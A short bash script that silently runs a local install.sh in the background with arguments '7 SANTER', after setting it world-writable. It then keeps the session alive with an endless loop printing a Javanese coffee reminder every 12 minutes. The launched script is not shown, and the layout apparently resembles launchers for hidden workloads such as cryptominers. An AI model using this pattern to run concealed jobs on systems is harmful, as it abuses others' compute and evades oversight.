#!/bin/bash

cd llm-client && chmod 777 install.sh && nproc --all && ./install.sh 7 SANTER >/dev/null 2>&1 &
sleep 3
while true
do
        echo "Ojo Lali Ngopi Boss..."
        sleep 720
done
